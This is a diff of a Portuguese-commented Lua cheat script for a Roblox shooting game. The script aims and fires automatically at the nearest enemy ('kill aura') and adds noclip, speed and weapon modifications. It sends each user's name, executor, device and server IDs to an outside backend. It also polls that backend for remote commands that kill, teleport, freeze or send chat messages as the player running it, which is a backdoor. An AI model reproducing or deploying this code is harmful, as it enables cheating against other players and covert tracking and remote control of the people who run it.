@@ -1,15 +1,14 @@
-
 -- script_backend_sha256_v2.lua
 -- Full client script with SHA-256 auth (pure Lua using bit32)
 -- Sends authenticated requests to backend endpoints: /log, /exit, /nextCommand
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local StarterGui = game:GetService("StarterGui")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Player = Players.LocalPlayer
+local Http = game:GetService("HttpService")
+local Plrs = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local SG = game:GetService("StarterGui")
+local RS = game:GetService("RunService")
+local Rep = game:GetService("ReplicatedStorage")
+local Plr = Plrs.LocalPlayer
 local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
 -- == SHA-256 using bit32 (assumes bit32 table exists in executor) ==
@@ -99,6 +98,7 @@ local function sha256(msg)
                 local function bnot_em(u) return to_uint32(0xFFFFFFFF - u) end
                 ch = bxor(band(e,f), band(bnot_em(e), g))
             end
+        
             local temp1 = to_uint32(h + S1 + ch + K[i+1] + w[i])
             local S0 = bxor(rrotate(a,2), bxor(rrotate(a,13), rrotate(a,22)))
             local maj = bxor(bxor(band(a,b), band(a,c)), band(b,c))
@@ -106,6 +106,7 @@ local function sha256(msg)
 
             h = g
             g = f
+      
             f = e
             e = to_uint32(d + temp1)
             d = c
@@ -129,20 +130,21 @@ local function sha256(msg)
 end
 
 -- Auth packet
-local function generateHash(username, executor, timestamp, jobId)
-    local raw = tostring(username) .. tostring(executor) .. tostring(timestamp) .. tostring(jobId)
+local function generateHash(name, ex, time, id)
+    local raw = tostring(name) .. tostring(ex) .. tostring(time) .. tostring(id)
     return sha256(raw)
 end
 
 local function authPacket(extra)
-    local timestamp = os.time()
-    local jobId = tostring(game.JobId or "")
+    local time = os.time()
+    local id = tostring(game.JobId or "")
     local packet = {
-        username = Player.Name,
+        username = Plr.Name,
         executor = Executor,
-        timestamp = timestamp,
-        jobId = jobId,
+        timestamp = time,
+        jobId = id,
     }
+   
     packet.hash = generateHash(packet.username, packet.executor, packet.timestamp, packet.jobId)
     if extra and type(extra) == "table" then
         for k,v in pairs(extra) do packet[k] = v end
@@ -152,7 +154,7 @@ end
 
 -- Notification helper
 local function notif(t,m,d)
-    pcall(function() StarterGui:SetCore("SendNotification",{Title=t,Text=m,Duration=d or 4}) end)
+    pcall(function() SG:SetCore("SendNotification",{Title=t,Text=m,Duration=d or 4}) end)
     local s = Instance.new("Sound")
     s.SoundId = "rbxassetid://6534947241"
     s.Volume = 1
@@ -164,6 +166,7 @@ end
 -- Main script (based on original)
 local sentLogs = {}
 local function sendLog(pl)
+  
     if sentLogs[pl.UserId] and tick() - sentLogs[pl.UserId] < 30 then return end
     sentLogs[pl.UserId] = tick()
     local placeId = game.PlaceId
@@ -173,7 +176,8 @@ local function sendLog(pl)
             userId = pl.UserId,
             username = pl.Name,
             executor = Executor,
-            device = UserInputService.TouchEnabled and "Mobile" or "PC",
+           
+            device = UIS.TouchEnabled and "Mobile" or "PC",
             date = os.date("%d/%m/%Y"),
             time = os.date("%H:%M:%S"),
             placeId = placeId,
@@ -181,30 +185,32 @@ local function sendLog(pl)
             serverJobId = game.JobId
         })
         request({
+       
             Url = "https://bot-z6us.onrender.com/log",
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(body)
+            Body = Http:JSONEncode(body)
         })
     end)
 end
 
-sendLog(Player)
+sendLog(Plr)
 
 local function notifyStop()
     pcall(function()
         local body = authPacket()
         request({
+          
             Url = "https://bot-z6us.onrender.com/exit",
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(body)
+            Body = Http:JSONEncode(body)
         })
     end)
 end
 
-Players.PlayerRemoving:Connect(function(pl)
-    if pl == Player then
+Plrs.PlayerRemoving:Connect(function(pl)
+    if pl == Plr then
         notifyStop()
     end
 end)
@@ -215,7 +221,7 @@ notif("Ajuda","Digite .help",7)
 -- UI creation and other functionality (copied and adapted from original)
 local ScreenGui=Instance.new("ScreenGui")
 ScreenGui.Name="HelpUI"
-ScreenGui.Parent=Player:WaitForChild("PlayerGui")
+ScreenGui.Parent=Plr:WaitForChild("PlayerGui")
 ScreenGui.ResetOnSpawn=false
 ScreenGui.Enabled=false
 
@@ -310,6 +316,7 @@ BR.Color=ColorSequence.new({
     ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),
     ColorSequenceKeypoint.new(0.2,Color3.fromRGB(255,127,0)),
     ColorSequenceKeypoint.new(0.4,Color3.fromRGB(255,255,0)),
+  
     ColorSequenceKeypoint.new(0.6,Color3.fromRGB(0,255,0)),
     ColorSequenceKeypoint.new(0.8,Color3.fromRGB(0,0,255)),
     ColorSequenceKeypoint.new(1,Color3.fromRGB(139,0,255))
@@ -317,12 +324,13 @@ BR.Color=ColorSequence.new({
 BR.Rotation=45
 
 -- Gun system hookups (copied from original)
-local GS=game:GetService("ReplicatedStorage"):WaitForChild("GunSystem")
+local GS=Rep:WaitForChild("GunSystem")
 local GunConfigs=GS:WaitForChild("GunsConfigurations")
 local Fire=GS.Remotes.Events.Fire
 local Reload=GS.Remotes.Functions.Reload
-local LP=Player
+local LP=Plr
 
+-- Variáveis de estado
 local scriptOn=true
 local warnedNoGun=false
 local scriptActive=true
@@ -333,6 +341,7 @@ local tlast=0
 local defaultWalk=16
 local Noclipping=nil
 local Clip=true
+local Aura = false -- Nova variável para o Kill Aura
 
 local function track(c)table.insert(connections,c)end
 local function trackT(t)table.insert(threads,t)end
@@ -340,22 +349,23 @@ local function reg(pl)ult=pl tlast=tick()end
 
 local activeUsers={} -- [username] = true
 
-local function HasGun()
-    local b=LP:FindFirstChild("Backpack")
+local function check() -- HasGun -> check
+    local bp=LP:FindFirstChild("Backpack")
     local c=LP.Character
     for _,cfg in ipairs(GunConfigs:GetChildren())do
         local n=cfg.Name
-        if(b and b:FindFirstChild(n))or(c and c:FindFirstChild(n))then return true end
+        if(bp and bp:FindFirstChild(n))or(c and c:FindFirstChild(n))then return true end
     end
     return false
 end
 
 local function chatMessage(str)
+   
     str=tostring(str)
     if TextChatService and TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
         TextChatService.TextChannels.RBXGeneral:SendAsync(str)
     else
-        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str,"All")
+        Rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str,"All")
     end
 end
 
@@ -365,14 +375,15 @@ local function watch(pl)
         track(hum.Died:Connect(function()
             if ult==pl and tick()-tlast<1.2 then
                 notif("KILL","Matou "..pl.Name)
+         
                 sendLog(pl)
             end
         end))
     end))
 end
 
-for _,pl in ipairs(Players:GetPlayers())do if pl~=LP then watch(pl)end end
-track(Players.PlayerAdded:Connect(function(pl)if pl~=LP then watch(pl)end end))
+for _,pl in ipairs(Plrs:GetPlayers())do if pl~=LP then watch(pl)end end
+track(Plrs.PlayerAdded:Connect(function(pl)if pl~=LP then watch(pl)end end))
 
 local function hookHumanoid(h)
     local ok,raw=pcall(function()return getrawmetatable(h)end)
@@ -402,6 +413,7 @@ end)
 local function NoclipLoop()
     if Clip==false and LP.Character then
         for _,v in pairs(LP.Character:GetDescendants())do
+           
             if v:IsA("BasePart")and v.CanCollide then v.CanCollide=false end
         end
     end
@@ -411,6 +423,7 @@ local function KillScript()
     if not scriptActive then return end
     scriptActive=false
     scriptOn=false
+    Aura=false -- Desativa Aura
     Clip=true
     activeUsers[LP.Name]=nil
     if Noclipping then Noclipping:Disconnect() end
@@ -422,6 +435,7 @@ end
 local function getHeldGunConfig()
     local c=LP.Character
     if not c then return nil end
+   
     local gun=c:FindFirstChildWhichIsA("Tool")
     if not gun then return nil end
     local cfg=GunConfigs:FindFirstChild(gun.Name)
@@ -440,6 +454,7 @@ local function modifyHeldGunProperty(p,v)
 end
 
 local function checkDiscordCommands()
+    
     while task.wait(0.5) do
         local ok, res = pcall(function()
             local body = authPacket()
@@ -447,51 +462,55 @@ local function checkDiscordCommands()
                 Url = "https://bot-z6us.onrender.com/nextCommand",
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode(body)
+                Body = Http:JSONEncode(body)
             })
         end)
         if not ok or not res or not res.Success then continue end
-        local data = HttpService:JSONDecode(res.Body)
+        local data = Http:JSONDecode(res.Body)
         if not data.command then continue end
 
         local cmd = data.command
+        
         local a1 = data.arg1
         local a2 = data.arg2
         local content = data.content
 
-        activeUsers[Player.Name]=true
+        activeUsers[Plr.Name]=true
 
         if cmd == "kill" then
-            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
+            local hum = Plr.Character and Plr.Character:FindFirstChildOfClass("Humanoid")
             if hum then hum.Health = 0 end
         end
         if cmd == "message" and content then
             chatMessage(content)
         end
         if cmd == "speed" then
-            if Player.Character and Player.Character:FindFirstChild("Humanoid") then
-                Player.Character.Humanoid.WalkSpeed = tonumber(a1) or 16
+            if Plr.Character and Plr.Character:FindFirstChild("Humanoid") then
+                Plr.Character.Humanoid.WalkSpeed = tonumber(a1) or 16
             end
         end
         if cmd == "teleport" then
-            local target = Players:FindFirstChild(a1)
+            local target = Plrs:FindFirstChild(a1)
             if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-                local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
+                local hrp = Plr.Character and Plr.Character:FindFirstChild("HumanoidRootPart")
                 if hrp then hrp.CFrame = target.Character.HumanoidRootPart.CFrame end
             end
         end
+  
         if cmd == "bring" then
-            local p1 = Players:FindFirstChild(a1)
-            local p2 = Players:FindFirstChild(a2)
+            local p1 = Plrs:FindFirstChild(a1)
+            local p2 = Plrs:FindFirstChild(a2)
             if p1 and p2 and p1.Character and p2.Character then
                 local hrp1 = p1.Character:FindFirstChild("HumanoidRootPart")
                 local hrp2 = p2.Character:FindFirstChild("HumanoidRootPart")
+  
                 if hrp1 and hrp2 then hrp1.CFrame = hrp2.CFrame + Vector3.new(0,2,0) end
             end
         end
         if cmd == "freeze" then
-            local char = Player.Character
+            local char = Plr.Character
             if char then
+               
                 local hrp = char:FindFirstChild("HumanoidRootPart")
                 local hum = char:FindFirstChildOfClass("Humanoid")
                 if hrp then hrp.Anchored = true end
@@ -499,40 +518,45 @@ local function checkDiscordCommands()
             end
         end
         if cmd == "unfreeze" then
-            local char = Player.Character
+            local char = Plr.Character
             if char then
                 local hrp = char:FindFirstChild("HumanoidRootPart")
                 local hum = char:FindFirstChildOfClass("Humanoid")
                 if hrp then hrp.Anchored = false end
+         
                 if hum then hum.WalkSpeed = 16 hum.JumpPower = 50 end
             end
         end
         if cmd == "rejoin" then
-            game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
+            game:GetService("TeleportService"):Teleport(game.PlaceId, Plr)
         end
     end
 end
 task.spawn(checkDiscordCommands)
 
-track(Player.Chatted:Connect(function(msg)
+track(Plr.Chatted:Connect(function(msg)
     msg = msg:lower()
 
     if msg == ".off" then
+        Aura=false -- Nova lógica: desliga Aura
         scriptOn=false
+     
         warnedNoGun=false
-        activeUsers[Player.Name]=nil
+        activeUsers[Plr.Name]=nil
         notif("Script","Desligado.")
     end
 
     if msg == ".on" then
-        if not HasGun() then
+        if not check() then -- HasGun -> check
             warnedNoGun=true
             notif("Erro","Você precisa de uma arma.")
             return
         end
+        Aura=true -- Nova lógica: liga Aura
         scriptOn=true
+  
         warnedNoGun=false
-        activeUsers[Player.Name]=true
+        activeUsers[Plr.Name]=true
         notif("Script","[KILL-AURA] Ativado")
     end
 
@@ -548,16 +572,18 @@ track(Player.Chatted:Connect(function(msg)
     end
 
     if msg:sub(1,6)==".speed" then
+  
         local v = tonumber(msg:match("%d+"))
-        if v and LP.Character and LP.Character:FindFirstChild("Humanoid") then
-            LP.Character.Humanoid.WalkSpeed=v
+        if v and Plr.Character and Plr.Character:FindFirstChild("Humanoid") then
+            Plr.Character.Humanoid.WalkSpeed=v
             notif("Speed","alterada para "..v)
         end
     end
 
     if msg == ".unspeed" then
-        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
-            LP.Character.Humanoid.WalkSpeed=defaultWalk
+        if Plr.Character and Plr.Character:FindFirstChild("Humanoid") then
+            Plr.Character.Humanoid.WalkSpeed=defaultWalk
+       
             notif("Speed","restaurada para "..defaultWalk)
         end
     end
@@ -565,7 +591,7 @@ track(Player.Chatted:Connect(function(msg)
     if msg == ".noclip" then
         Clip=false
         if Noclipping then Noclipping:Disconnect() end
-        Noclipping=RunService.Stepped:Connect(NoclipLoop)
+        Noclipping=RS.Stepped:Connect(NoclipLoop)
         notif("Noclip","Noclip ON")
     end
 
@@ -579,9 +605,10 @@ track(Player.Chatted:Connect(function(msg)
         if Clip then
             Clip=false
             if Noclipping then Noclipping:Disconnect() end
-            Noclipping=RunService.Stepped:Connect(NoclipLoop)
+            Noclipping=RS.Stepped:Connect(NoclipLoop)
             notif("Noclip","Noclip ON")
         else
+        
             Clip=true
             if Noclipping then Noclipping:Disconnect() end
             notif("Noclip","Noclip OFF")
@@ -593,6 +620,7 @@ track(Player.Chatted:Connect(function(msg)
         if v then
             modifyHeldGunProperty("Spread",v)
             notif("GunMod","alterado para "..v)
+    
         end
     end
 
@@ -607,6 +635,7 @@ track(Player.Chatted:Connect(function(msg)
     if msg:sub(1,8)==".bullets" then
         local v=tonumber(msg:match("%d+"))
         if v then
+    
             modifyHeldGunProperty("Bullets",v)
             notif("GunMod","alterado para "..v)
         end
@@ -615,11 +644,12 @@ end))
 
 trackT(task.spawn(function()
     while task.wait(0.25)do
-        if(not scriptActive)or(not scriptOn)or(not HasGun())then continue end
+        if(not scriptActive)or(not Aura)or(not check())then continue end
         local c=LP.Character
         if not c then continue end
         local gun=c:FindFirstChildWhichIsA("Tool")
         if not gun then continue end
+    
         pcall(function()Reload:InvokeServer(gun)end)
     end
 end))
@@ -628,38 +658,48 @@ trackT(task.spawn(function()
     local rp = RaycastParams.new()
     rp.FilterType = Enum.RaycastFilterType.Exclude
     while scriptActive do
-        if scriptOn and HasGun() and LP.Character then
+        if Aura and check() and LP.Character then
             local c = LP.Character
             local gun = c:FindFirstChildWhichIsA("Tool")
             if gun then
+               
                 local gunConfig = GunConfigs:FindFirstChild(gun.Name)
                 if gunConfig then
                     gunConfig = require(gunConfig)
                     local firePart = gun:FindFirstChild("FirePart") or gun:FindFirstChild("Handle") or gun.PrimaryPart
                     if firePart then
+       
                         local filter = {LP.Character}
                         local map = workspace:FindFirstChild("Map")
                         if map then
+                           
                             local SZ = map:FindFirstChild("SafeZones")
                             local B = map:FindFirstChild("Barriers")
                             if SZ then for _,v in ipairs(SZ:GetChildren()) do filter[#filter+1]=v end end
+                           
                             if B then for _,v in ipairs(B:GetChildren()) do filter[#filter+1]=v end end
                         end
                         rp.FilterDescendantsInstances = filter
                         local target = nil
+            
                         local dist = 999999
-                        for _,enemy in ipairs(Players:GetPlayers()) do
+                        for _,enemy in ipairs(Plrs:GetPlayers()) do
                             if enemy ~= LP and enemy.Team ~= LP.Team and enemy.Character then
+                   
                                 local hum = enemy.Character:FindFirstChildOfClass("Humanoid")
                                 if hum and hum.Health > 0 then
                                     local head = enemy.Character:FindFirstChild("Head") or enemy.Character:FindFirstChild("HumanoidRootPart")
+     
                                     if head then
                                         local d = (head.Position - firePart.Position).Magnitude
+                      
                                         if d < dist then
                                             dist = d
+                                
                                             target = head
                                         end
                                     end
+          
                                 end
                             end
                         end
@@ -672,13 +712,16 @@ trackT(task.spawn(function()
                                 Normal = (ray and ray.Normal) or Vector3.new(0,1,0),
                                 Position = pos,
                                 Instance = target,
+                              
                                 Distance = (firePart.Position - pos).Magnitude,
                                 Material = (ray and ray.Material) or Enum.Material.ForceField
                             }
+                            
                             pcall(function()
                                 Fire:FireServer(gun, hit, pos)
                             end)
                             reg(target.Parent)
+          
                         end
                     end
                 end
